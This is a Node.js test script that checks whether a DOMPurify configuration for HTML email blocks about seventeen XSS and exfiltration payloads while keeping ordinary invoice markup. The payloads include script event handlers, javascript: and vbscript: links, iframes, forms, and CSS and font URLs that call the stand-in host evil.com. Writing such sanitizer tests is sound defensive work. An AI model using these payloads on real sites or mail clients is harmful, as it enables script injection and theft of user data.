const DOMPurify = require("isomorphic-dompurify");

const OPTS = {
  USE_PROFILES: { html: true },
  FORBID_TAGS: ["form", "input", "button", "select", "textarea", "option", "label", "fieldset"],
  FORBID_ATTR: ["srcset", "formaction", "ping"],
  ALLOWED_URI_REGEXP: /^(?:(?:https?|mailto|cid|tel):|[^a-z]|[a-z+.-]+(?:[^a-z+.:-]|$))/i,
};

const payloads = {
  "script tag": `<img src=x onerror="alert(1)">`,
  "svg onload": `<svg onload="alert(2)"></svg>`,
  "javascript href": `<a href="javascript:alert(3)">x</a>`,
  "data html": `<a href="data:text/html,<script>alert(4)</script>">x</a>`,
  iframe: `<iframe src="https://evil.com"></iframe>`,
  form: `<form action="https://evil.com"><input name=q></form>`,
  "meta refresh": `<meta http-equiv="refresh" content="0;url=https://evil.com">`,
  "css exfil": `<style>body{background:url(https://evil.com/log?c=1)}</style>`,
  "link stylesheet": `<link rel=stylesheet href="https://evil.com/x.css">`,
  "target blank": `<a href="https://ok.com" target="_blank">y</a>`,
  "base tag": `<base href="https://evil.com/">`,
  object: `<object data="https://evil.com"></object>`,
  "font face src": `<style>@font-face{font-family:x;src:url(https://evil.com/f.woff)}</style>`,
  "img srcset": `<img srcset="https://evil.com/t.php 1x">`,
  "vbscript href": `<a href="vbscript:msgbox(1)">x</a>`,
  "onclick attr": `<div onclick="steal()">x</div>`,
  "hidden form": `<form><input type=hidden name=token value=1></form>`,
};

let leaks = 0;
for (const [name, html] of Object.entries(payloads)) {
  const out = DOMPurify.sanitize(html, OPTS);
  const dangerous =
    /onerror|onload|onclick|javascript:|vbscript:|data:text\/html|<form|<input|<iframe|<meta|<link|<object|<base/i.test(
      out,
    );
  if (dangerous) leaks++;
  console.log(`${dangerous ? "FUITE " : "bloque"} ${name.padEnd(18)} ${JSON.stringify(out).slice(0, 90)}`);
}
console.log("\nfuites:", leaks, "/", Object.keys(payloads).length);

console.log("\n=== mail legitime preserve ? ===");
const legit = `<div style="color:#333"><p>Bonjour,</p><p>Votre <b>facture</b> est ici :</p>
<a href="https://example.com/facture">telecharger</a>
<img src="cid:logo@ex" alt="logo">
<table><tr><td>Total</td><td>90 EUR</td></tr></table>
<ul><li>Article A</li></ul></div>`;
const out = DOMPurify.sanitize(legit, OPTS);
console.log(out);
const kept = ["<b>facture</b>", 'href="https://example.com/facture"', "cid:logo@ex", "<table>", "<ul>"].every(
  (s) => out.includes(s),
);
console.log("\nelements legitimes preserves:", kept ? "OUI" : "NON - trop agressif");
